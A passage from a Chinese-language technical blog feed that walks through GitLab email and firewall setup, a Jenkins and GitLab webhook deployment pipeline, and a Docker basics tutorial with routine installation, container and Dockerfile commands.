<h3 id="1-1-2-相关配置以及命令"><a href="#1-1-2-相关配置以及命令" class="headerlink" title="1.1.2 相关配置以及命令"></a>1.1.2 相关配置以及命令</h3><p>vim &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb				&#x2F;&#x2F;如有必要修改配置<br>gitlab-ctl reconfigure		&#x2F;&#x2F;修改完配置后，需要重新配置<br>gitlab-ctl restart			&#x2F;&#x2F;重启服务，尽管服务启动完成后，仍需稍等片刻才能正常访问</p>
<h3 id="1-1-3-通知邮箱配置"><a href="#1-1-3-通知邮箱配置" class="headerlink" title="1.1.3 通知邮箱配置"></a>1.1.3 通知邮箱配置</h3><blockquote>
<p>这里以163邮箱为例，其他邮箱配置请查看官方文档：<a href="https://docs.gitlab.com/omnibus/settings/smtp.html">https://docs.gitlab.com/omnibus/settings/smtp.html</a></p>
</blockquote>
<p>执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/gitlab/gitlab.rb</span><br></pre></td></tr></table></figure>
<p>在此文件中新增以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Smtp configuration</span><br><span class="line">gitlab_rails[&#x27;smtp_enable&#x27;] = true</span><br><span class="line">gitlab_rails[&#x27;smtp_address&#x27;] = &quot;smtp.163.com&quot;</span><br><span class="line">gitlab_rails[&#x27;smtp_port&#x27;] = 25</span><br><span class="line">gitlab_rails[&#x27;smtp_user_name&#x27;] = &quot;xxx@163.com&quot;	#改为真实的163邮箱</span><br><span class="line">gitlab_rails[&#x27;smtp_password&#x27;] = &quot;xxx&quot;		#邮箱密码</span><br><span class="line">gitlab_rails[&#x27;smtp_domain&#x27;] = &quot;163.com&quot;</span><br><span class="line">gitlab_rails[&#x27;smtp_authentication&#x27;] = &quot;login&quot;</span><br><span class="line">gitlab_rails[&#x27;smtp_enable_starttls_auto&#x27;] = true</span><br><span class="line">gitlab_rails[&#x27;smtp_openssl_verify_mode&#x27;] = &#x27;peer&#x27;</span><br><span class="line"></span><br><span class="line"># If your SMTP server does not like the default &#x27;From: gitlab@localhost&#x27; you</span><br><span class="line"># can change the &#x27;From&#x27; with this setting.</span><br><span class="line">gitlab_rails[&#x27;gitlab_email_from&#x27;] = &#x27;xxx@163.com&#x27;	#改为真实的163邮箱</span><br><span class="line">gitlab_rails[&#x27;gitlab_email_reply_to&#x27;] = &#x27;xxx@163.com&#x27;	#改为真实的163邮箱</span><br></pre></td></tr></table></figure>
<p>最后执行gitlab-ctl reconfigure重新加载配置</p>
<h3 id="1-1-4-开放8888端口"><a href="#1-1-4-开放8888端口" class="headerlink" title="1.1.4 开放8888端口"></a>1.1.4 开放8888端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8888/tcp --permanent</span><br><span class="line">systemctl reload firewalld</span><br></pre></td></tr></table></figure>
<p>通过<a href="http://zhifei.gitlab.com:8888去访问">http://zhifei.gitlab.com:8888去访问</a></p>
<h2 id="1-2-jenkins安装（前提需要java环境）"><a href="#1-2-jenkins安装（前提需要java环境）" class="headerlink" title="1.2 jenkins安装（前提需要java环境）"></a>1.2 jenkins安装（前提需要java环境）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo</span><br><span class="line">sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key</span><br><span class="line">yum install -y jenkins    //如果镜像源连接不同，则到官网下载对应版本的rpm包，使用rpm -ivh jenkins的rpm包进行安装</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/jenkins		//修改端口，默认为8080，改为8250或其它没被占用的端口</span><br><span class="line">vim /etc/init.d/jenkins		//指定java命令的位置，如下图所示</span><br></pre></td></tr></table></figure>
<p><img src="/../img/202204200528690.png" alt="在这里插入图片描述"><br>相关命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自启动配置：</span><br><span class="line">chkconfig --add /etc/init.d/jenkins</span><br><span class="line">chkconfig jenkins on</span><br><span class="line"></span><br><span class="line">systemctl start jenkins.service		#启动</span><br><span class="line">systemctl stop jenkins.service		#停止</span><br><span class="line">systemctl status jenkins.service		#查看状态</span><br><span class="line">systemctl restart jenkins.service		#重启</span><br></pre></td></tr></table></figure>
<p>开放8250端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8250/tcp --permanent</span><br><span class="line">systemctl reload firewalld</span><br></pre></td></tr></table></figure>
<p>通过：<a href="http://ip:port去访问：">http://ip:port去访问：</a><br>查看初始密码：cat &#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;secrets&#x2F;initialAdminPassword</p>
<h1 id="2-自动化配置"><a href="#2-自动化配置" class="headerlink" title="2. 自动化配置"></a>2. 自动化配置</h1><h2 id="2-1-本地创建vue项目并提交到gitlab"><a href="#2-1-本地创建vue项目并提交到gitlab" class="headerlink" title="2.1 本地创建vue项目并提交到gitlab"></a>2.1 本地创建vue项目并提交到gitlab</h2><p>如下图所示：<br><img src="/../img/202204200529376.png" alt="在这里插入图片描述"></p>
<h2 id="2-2-jenkins配置"><a href="#2-2-jenkins配置" class="headerlink" title="2.2 jenkins配置"></a>2.2 jenkins配置</h2><p>1）插件安装：系统管理》插件管理》可选插件》安装GitLab Plugin、Generic Webhook Trigger Plugin、Publish over SSH<br>2）系统管理》系统配置》Publish over SSH</p>
<blockquote>
<p>这个插件的主要作用：通常情况下，jenkins服务器和实际的项目不是同一个服务器，主要用于把jenkins拉取到的代码远程发送到实际的服务器上，并执行响应的脚本，如果是在同一个服务器，且系统的用户相同，则不需要此配置。</p>
</blockquote>
<p>i.登录jenkins服务器，查看该用户（启动jenkins的用户）是否已经配置了ssh秘钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa	#如果有此文件，则已经有配置过了，可以直接使用，如果不存在，则需要生成公私秘钥</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa	#指定生成的路径（不指定默认为当前用户的.ssh/id_rsa和id_rsa.pub）、秘钥的密码（不指定默认为空）</span><br></pre></td></tr></table></figure>
<p>ii.把~&#x2F;.ssh&#x2F;id_rsa和id_rsa.pub复制到&#x2F;var&#x2F;lib&#x2F;jenkins&#x2F;.ssh&#x2F;下，如果没有此目录，先创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /var/lib/jenkins/.ssh/		#如果没有此目录，先创建</span><br><span class="line">cp ~/.ssh/id_rsa ~/.ssh/id_rsa.pub /var/lib/jenkins/.ssh/	#复制到/var/lib/jenkins/.ssh/</span><br></pre></td></tr></table></figure>
<p>iii.配置免密登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.xxx.xxx</span><br><span class="line"></span><br><span class="line">指令说明：ssh-copy-id -i 公钥 远程服务器的用户@远程服务器的ip，本人测试搭建用的是root用户，实际中不建议使用root用户</span><br><span class="line"></span><br><span class="line">测试免密登录是否配置成功：</span><br><span class="line">ssh 192.168.xxx.xxx</span><br></pre></td></tr></table></figure>
<p>ⅳ.回到jenkins界面》系统管理》系统配置》Publish over SSH<br><img src="/../img/202204200529503.png" alt="在这里插入图片描述"><br>ⅴ.jenkins任务配置<img src="/../img/202204200530481.png" alt="在这里插入图片描述"><br><img src="/../img/202204200530506.png" alt="在这里插入图片描述"><br><img src="/../img/202204200530800.png" alt="在这里插入图片描述"><br>生成secret token，gitlab钩子要用到：<br><img src="/../img/202204200530785.png" alt="在这里插入图片描述"><br><img src="/../img/202204200530302.png" alt="在这里插入图片描述"><br>脚本内容，仅供参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@zhifei bbb]# cat start.sh </span><br><span class="line">export PATH=/usr/local/node/bin:$PATH</span><br><span class="line">cd /root/bbb</span><br><span class="line">npm install</span><br><span class="line">netstat -apn|grep 8081|grep LISTEN|awk -F&#x27; &#x27; &#x27;&#123;print $7&#125;&#x27;|awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|xargs kill -9</span><br><span class="line">nohup npm run dev &gt; ./sys-info.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<h2 id="2-3-gitlab钩子配置"><a href="#2-3-gitlab钩子配置" class="headerlink" title="2.3 gitlab钩子配置"></a>2.3 gitlab钩子配置</h2><p>具体项目》Settings》Webhooks<br><img src="/../img/202204200531292.png" alt="在这里插入图片描述"><br><img src="/../img/202204200532531.png" alt="在这里插入图片描述"><br><img src="/../img/202204200533496.png" alt="在这里插入图片描述"><br>最后测试一下是否配置成功：<br><img src="/../img/202204200532263.png" alt="在这里插入图片描述"><br>如果提示：Requests to the local network are not allowed，配置如下：<br><img src="/../img/202204200532912.png" alt="在这里插入图片描述"><br>最后，通过提交代码，去jenkins中查看，是否自动触发了构建<br><img src="/../img/202204200532150.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>自动化部署</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
        <tag>GitLab</tag>
        <tag>自动化部署</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker基础使用</title>
    <url>/2022/04/18/Docker%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="1-安装-卸载"><a href="#1-安装-卸载" class="headerlink" title="1. 安装-卸载"></a>1. 安装-卸载</h1><ul>
<li>注：这里使用centos7、docker-ce-20.10.2、docker-ce-cli-20.10.2作为实践例子</li>
</ul>
<h2 id="1-1-卸载旧版本"><a href="#1-1-卸载旧版本" class="headerlink" title="1.1 卸载旧版本"></a>1.1 卸载旧版本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine docker-ce docker-ce-cli</span><br></pre></td></tr></table></figure>

<h2 id="1-2-安装（repo方式）"><a href="#1-2-安装（repo方式）" class="headerlink" title="1.2 安装（repo方式）"></a>1.2 安装（repo方式）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装yum-utils软件包（提供yum-config-manager 实用程序）</span></span><br><span class="line">sudo yum install -y yum-utils</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置稳定的存储库(这里使用阿里云的地址)，官方地址：https://download.docker.com/linux/centos/docker-ce.repo</span></span><br><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新yum软件包索引</span></span><br><span class="line">yum makecache fast</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认安装最新版</span></span><br><span class="line">sudo yum -y install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或安装指定版本，查看可用版本（最新版在最上面）</span></span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如：docker-ce.x86_64      3:20.10.2-3.el7          docker-ce-stable</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定安装版本号，由第二列的分号(:)后开始到连接符(-)前结束，这里为20.10.2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令：<span class="built_in">sudo</span> yum -y install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io</span></span><br><span class="line">sudo yum -y install docker-ce-20.10.2 docker-ce-cli-20.10.2 containerd.io</span><br><span class="line"></span><br><span class="line">sudo systemctl start docker		# 启动</span><br><span class="line">sudo systemctl enable docker	# 自启动</span><br><span class="line">sudo docker run hello-world		# 运行hello-world镜像</span><br></pre></td></tr></table></figure>

<h2 id="1-3-配置镜像加速器"><a href="#1-3-配置镜像加速器" class="headerlink" title="1.3 配置镜像加速器"></a>1.3 配置镜像加速器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">腾讯云镜像加速器：https://mirror.ccs.tencentyun.com</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中国科学技术大学镜像：https://docker.mirrors.ustc.edu.cn</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Docker官方镜像（中国区）：https://registry.docker-cn.com</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网易云镜像加速器：https://hub-mirror.c.163.com</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">南京大学镜像加速器：https://docker.nju.edu.cn</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">阿里云镜像加速器：https://&lt;你的ID&gt;.mirror.aliyuncs.com（需登录阿里云控制台获取）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DaoCloud镜像加速器：https://docker.m.daocloud.io</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">百度云镜像站：https://mirror.baidubce.com</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;:</span><br><span class="line">    [</span><br><span class="line">        &quot;https://mirror.ccs.tencentyun.com&quot;,</span><br><span class="line">        &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">        &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">        &quot;https://hub-mirror.c.163.com&quot;,</span><br><span class="line">        &quot;https://docker.nju.edu.cn&quot;,</span><br><span class="line">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="line">        &quot;https://mirror.baidubce.com&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>docker info（查看配置加速器是否生效，在最下面显示配置的加速器地址）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry Mirrors:</span><br><span class="line">具体加速器地址...</span><br></pre></td></tr></table></figure>

<h1 id="2-仓库-镜像-容器"><a href="#2-仓库-镜像-容器" class="headerlink" title="2. 仓库-镜像-容器"></a>2. 仓库-镜像-容器</h1><p>仓库：存放镜像；</p>
<p>镜像：只读的分层文件系统；</p>
<p>容器：镜像的实例；</p>
<p>若把容器比作Java对象，则镜像为Java类，仓库为方法区。</p>
<h1 id="3-常用命令"><a href="#3-常用命令" class="headerlink" title="3. 常用命令"></a>3. 常用命令</h1><h2 id="3-1-帮助命令"><a href="#3-1-帮助命令" class="headerlink" title="3.1 帮助命令"></a>3.1 帮助命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version		# 查看docker版本</span><br><span class="line">docker info         # 查看docker详细信息</span><br><span class="line">docker --help       # 查看帮助文档</span><br></pre></td></tr></table></figure>

<h2 id="3-2-镜像命令"><a href="#3-2-镜像命令" class="headerlink" title="3.2 镜像命令"></a>3.2 镜像命令</h2> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images [-aq]		# 查看docker镜像，a表示all，q表示只显示镜像ID，--no-trunc表示显示详细的镜像ID，--digests表示显示镜像的摘要信息</span><br><span class="line">docker images [镜像名称或镜像id:&lt;TAG&gt;]		# 查看指定镜像信息</span><br><span class="line">docker history [镜像名称或镜像id:&lt;TAG&gt;]		# 查看指定镜像构建过程信息</span><br><span class="line">docker search [Options] tomcat		# 从https://hub.docker.com/上搜索tomcat镜像，可选参数为：--help(帮助文档)，--no-tranc(详细信息)，--limit(限制搜索结果条数)，-s（显示STARS数大于指定数的记录，新版本已移除此参数）</span><br><span class="line">docker pull tomcat[:TAG]          # 不写TAG，等价于:latest，最新版本</span><br><span class="line">docker rmi [-f] hello-world[:TAG]        # 通过唯一镜像名删除镜像，-f强制删除（使用中的镜像），不指定TAG默认删除latest版本</span><br><span class="line">docker rmi [-f] 镜像ID[:TAG]       # 通过镜像ID删除镜像</span><br><span class="line">docker rmi [-f] 镜像名1[:TAG] 镜像名2[:TAG]       # 批量删除镜像</span><br><span class="line">docker rmi [-f] $(docker images -qa)              # 删除所有镜像</span><br><span class="line"></span><br><span class="line">docker build -f &lt;Dockerfile文件&gt; -t [&lt;镜像命名空间&gt;/]&lt;镜像名&gt;[:&lt;TAG&gt;] .	# 按照Dockerfile构建镜像</span><br></pre></td></tr></table></figure>

<ul>
<li>docker push相关</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录仓库</span></span><br><span class="line">docker login</span><br><span class="line">Usage:  docker login [OPTIONS] [SERVER]</span><br><span class="line">Log in to a Docker registry.</span><br><span class="line">If no server is specified, the default is defined by the daemon.</span><br><span class="line">Options:</span><br><span class="line">-p, --password string   Password</span><br><span class="line">   --password-stdin    Take the password from stdin</span><br><span class="line">-u, --username string   Username</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建并提交镜像</span></span><br><span class="line">docker commit</span><br><span class="line">Usage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line">Create a new image from a container&#x27;s changes</span><br><span class="line">Options:</span><br><span class="line">  -a, --author string    Author (e.g., &quot;John Hannibal Smith &lt;hannibal@a-team.com&gt;&quot;) 作者信息</span><br><span class="line">  -c, --change list      Apply Dockerfile instruction to the created image </span><br><span class="line">  -m, --message string   Commit message 提交信息</span><br><span class="line">  -p, --pause            Pause container during commit (default true)</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建tag</span></span><br><span class="line">docker tag</span><br><span class="line">Usage:  docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]</span><br><span class="line">Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推送镜像到仓库</span></span><br><span class="line">docker push</span><br><span class="line">Usage:  docker push [OPTIONS] NAME[:TAG]</span><br><span class="line">Push an image or a repository to a registry</span><br><span class="line">Options:</span><br><span class="line">-a, --all-tags                Push all tagged images in the repository</span><br><span class="line">   --disable-content-trust   Skip image signing (default true)</span><br><span class="line">-q, --quiet                   Suppress verbose output</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">退出登录</span></span><br><span class="line">docker logout</span><br></pre></td></tr></table></figure>

<h2 id="3-3-容器命令"><a href="#3-3-容器命令" class="headerlink" title="3.3 容器命令"></a>3.3 容器命令</h2><h3 id="3-3-1-创建并启动容器"><a href="#3-3-1-创建并启动容器" class="headerlink" title="3.3.1 创建并启动容器"></a>3.3.1 创建并启动容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run [OPTIONS] 镜像ID/镜像名称 [COMMAND] [ARG…]		# 新建并启动容器</span><br><span class="line">可选参数OPTIONS：</span><br><span class="line">--name=容器新名字:为容器指定一个名称，等号可替换成空格;</span><br><span class="line">-i:以交互模式运行容器，通常与-t同时使用;</span><br><span class="line">-t:为容器重新分配一个伪输入终端，通常与-i同时使用;</span><br><span class="line">-P:随机端口映射;</span><br><span class="line">-p:指定端口映射，有以下四种格式：ip:hostPort:containerPort、ip::containerPort、hostPort:containerPort、containerPort</span><br><span class="line">容器一旦创建后，无法在docker start中指定映射端口，若要修改端口映射，需要修改以下2点。必须先停止容器后修改，然后重启docker，再启动容器：</span><br><span class="line">（1）/var/lib/docker/containers/容器id/hostconfig.json中的：</span><br><span class="line">&quot;PortBindings&quot;:&#123;&quot;80/tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;9999&quot;&#125;]&#125;    # 这里的80为容器端口，9999宿主端口</span><br><span class="line">（2）/var/lib/docker/containers/容器id/config.v2.json中的：</span><br><span class="line">&quot;ExposedPorts&quot;:&#123;&quot;80/tcp&quot;:&#123;&#125;&#125;      # 这里的80为容器端口</span><br><span class="line">-v 容器外目录:容器内目录[:ro]（nginx容器配置了此映射后，不会创建default.conf），:ro表示readonly只允许从宿主机单向写入操作，不允许容器对该目录做写操作</span><br><span class="line">-d 以后台守护进程的方式启动</span><br><span class="line"></span><br><span class="line">docker start 容器ID/容器名称       # 启动容器</span><br></pre></td></tr></table></figure>

<ul>
<li>通常用法：docker run -it -p 宿主端口:容器端口 -v 宿主目录:容器目录[:ro] –name&#x3D;容器名称 &lt;镜像名称或id&gt;</li>
</ul>
<h3 id="3-3-2-查看容器"><a href="#3-3-2-查看容器" class="headerlink" title="3.3.2 查看容器"></a>3.3.2 查看容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps [OPTIONS]         # 列出正在运行的容器</span><br><span class="line">可选参数OPTIONS：</span><br><span class="line">-q(静默模式，只显示容器编号)；</span><br><span class="line">-a(列出所有容器，包括所有状态)；</span><br><span class="line">-l(列出最近创建的1个容器，包括所有状态)；</span><br><span class="line">-n x(列出最近x个创建的容器，包括所有状态)；</span><br><span class="line">--no-tranc(不截断容器ID输出)；</span><br></pre></td></tr></table></figure>

<h3 id="3-3-3-退出容器"><a href="#3-3-3-退出容器" class="headerlink" title="3.3.3 退出容器"></a>3.3.3 退出容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit      # 停止容器并退出，使用：docker exec -it [容器id或容器名称] /bin/bash进入容器的前提，exit会退出当前shell，但不会导致容器停止</span><br><span class="line">ctrl+p+q      # 不停止退出</span><br></pre></td></tr></table></figure>

<h3 id="3-3-4-重启容器"><a href="#3-3-4-重启容器" class="headerlink" title="3.3.4 重启容器"></a>3.3.4 重启容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker restart 容器ID/容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3-3-5-停止容器"><a href="#3-3-5-停止容器" class="headerlink" title="3.3.5 停止容器"></a>3.3.5 停止容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker stop 容器ID/容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3-3-6-强制停止容器"><a href="#3-3-6-强制停止容器" class="headerlink" title="3.3.6 强制停止容器"></a>3.3.6 强制停止容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker kill 容器ID/容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3-3-7-删除容器"><a href="#3-3-7-删除容器" class="headerlink" title="3.3.7 删除容器"></a>3.3.7 删除容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rm [-f] 容器ID/容器名称      # 删除容器，-f强制删除（默认只删除已停止的容器），区别rmi（i代表image）</span><br><span class="line">docker rm -f $(docker ps -qa) # 删除所有容器，-f强制删除（默认只删除已停止的容器），等同于：docker ps -qa|xargs docker rm -f</span><br></pre></td></tr></table></figure>

<h3 id="3-3-8-拓展（重点）"><a href="#3-3-8-拓展（重点）" class="headerlink" title="3.3.8 拓展（重点）"></a>3.3.8 拓展（重点）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d 镜像ID/镜像名称       # 使用后台守护进程的方式启动，如果没有交互，会启动后立马停止，可通过以下命令测试：</span><br><span class="line">docker run -d centos /bin/sh -c &quot;while true; do echo hello-world; sleep 3; done&quot;</span><br><span class="line"></span><br><span class="line">docker logs -t -f --tail 5 容器ID/容器名称       # 查看logs，t:时间戳，f: 跟踪日志输出，--tail 5：最后5条日志</span><br><span class="line">docker top 容器ID/容器名称    # 查看容器内进程</span><br><span class="line">docker inspect 容器ID/容器名称      # 查看容器内部细节</span><br><span class="line">docker attach 容器ID/容器名称       # 重新进入容器启动命令的终端，不会启动新进程</span><br><span class="line">docker exec -it 容器ID/容器名称 shell命令		# 在容器内部执行对应的shell命令，为/bin/bash时，表示在容器打开新的终端，可以启动新的进程</span><br><span class="line"></span><br><span class="line">docker cp 容器ID/容器名称:容器内文件(目录) 容器外文件(目录)    # 复制容器内文件(目录)到容器外</span><br><span class="line">docker cp 容器外文件(目录) 容器ID/容器名称:容器内文件(目录)     # 复制容器外文件(目录)到容器内</span><br></pre></td></tr></table></figure>
<h1 id="4-容器数据卷"><a href="#4-容器数据卷" class="headerlink" title="4. 容器数据卷"></a>4. 容器数据卷</h1><h2 id="4-1-v参数"><a href="#4-1-v参数" class="headerlink" title="4.1 -v参数"></a>4.1 -v参数</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -p 宿主端口:容器端口 -v 宿主目录:容器目录[:ro] --name=容器名称 &lt;镜像名称或id&gt;		# -v参数实现容器内目录与宿主机目录数据同步，:ro表示readonly只允许从宿主机单向写入操作，不允许容器对该目录做写操作。如果目录不存在，则会自动创建</span><br></pre></td></tr></table></figure>

<p> 例如：</p>
<p> docker run -it -d -p 9988:8080 -v &#x2F;opt&#x2F;docker&#x2F;tomcat-container&#x2F;webapps:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps –name&#x3D;tomcat-container tomcat</p>
<p> 可通过docker inspect [容器id或容器名称]，查看容器卷是否绑定成功，出现一下配置，则绑定成功：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: [</span><br><span class="line">                &quot;/opt/docker/tomcat-container/webapps:/usr/local/tomcat/webapps&quot;	# 宿主机目录:容器内目录</span><br><span class="line">            ]</span><br><span class="line">            </span><br><span class="line">&quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;bind&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/opt/docker/tomcat-container/webapps&quot;,	# 宿主机目录</span><br><span class="line">                &quot;Destination&quot;: &quot;/usr/local/tomcat/webapps&quot;,		# 容器内目录</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,		# RW，true-说明容器可以读写该目录下的内容；false-只能宿主机单向写入同步到容器中</span><br><span class="line">                &quot;Propagation&quot;: &quot;rprivate&quot;</span><br><span class="line">            &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="4-2-Dockerfile"><a href="#4-2-Dockerfile" class="headerlink" title="4.2 Dockerfile"></a>4.2 Dockerfile</h2><p> Dockerfile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p>
<ul>
<li><p>要求</p>
<ol>
<li>每条保留字指令都必须为大写字母且后面要跟随至少一个参数；</li>
<li>指令按照从上到下，顺序执行；</li>
<li>#表示注释；</li>
<li>每条指令都会创建一个新的镜像层，并对镜像进行提交；</li>
</ol>
</li>
<li><p>Dockerfile执行大致流程</p>
<ol>
<li>docker从基础镜像运行一个容器；</li>
<li>执行一条指令并对容器作出修改；</li>
<li>执行类似docker commit的操作提交一个新的镜像层；</li>
<li>基于刚提交的镜像运行一个新容器；</li>
<li>执行Dockerfile中的下一条指令直到所有指令都执行完成；</li>
</ol>
</li>
<li><p>语法</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>基础镜像，当前新镜像是基于哪个镜像的，语法：FROM scratch，其中scratch为基础镜像</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像维护者的姓名和邮箱地址</td>
</tr>
<tr>
<td>RUN</td>
<td>容器构建时需要运行的命令，docker build时执行</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>当前容器对外暴露出的端口</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>创建并启动容器后，终端默认登陆的进来工作目录，一个落脚点，且作为ADD&#x2F;COPY等指令的当前目录</td>
</tr>
<tr>
<td>ARG</td>
<td>设置环境变量，仅docker build时有效</td>
</tr>
<tr>
<td>ENV</td>
<td>设置环境变量，docker build、docker run时都有效，例如：ENV MY_PATH &#x2F;usr&#x2F;mypath</td>
</tr>
<tr>
<td>ADD</td>
<td>将宿主机目录下的文件拷贝进镜像且会自动处理URL和解压tar压缩包</td>
</tr>
<tr>
<td>COPY</td>
<td>类似ADD，拷贝文件和目录到镜像中。将从构建上下文目录中&lt;源路径&gt;的文件&#x2F;目录复制到新的一层的镜像内的&lt;目标路径&gt;位置.<br>写法一：COPY src dest <br>写法二：COPY [“src”,”dest”]</td>
</tr>
<tr>
<td>VOLUME</td>
<td>容器数据卷，用于数据保存和持久化工作</td>
</tr>
<tr>
<td>CMD</td>
<td>指定一个容器启动时要运行的命令。Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换<br>CMD指令的格式和RUN 相似，也是两种格式：<br/>● shell格式：CMD &lt;命令&gt;<br/>● exec 格式：CMD [“可执行文件”，”参数1”，”参数2”…]，如果可执行文件由多个指令通过&amp;&amp;构成，需要使用shell格式，即：CMD &lt;命令1&gt; &amp;&amp; &lt;命令2&gt;<br/>● 参数列表格式：CMD [“参数1”，”参数2”…]，在指定了ENTRYPOINT 指令后，用CMD指定具体的参数，可以通过docker run后的参数覆盖，常用作可变参数使用。</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
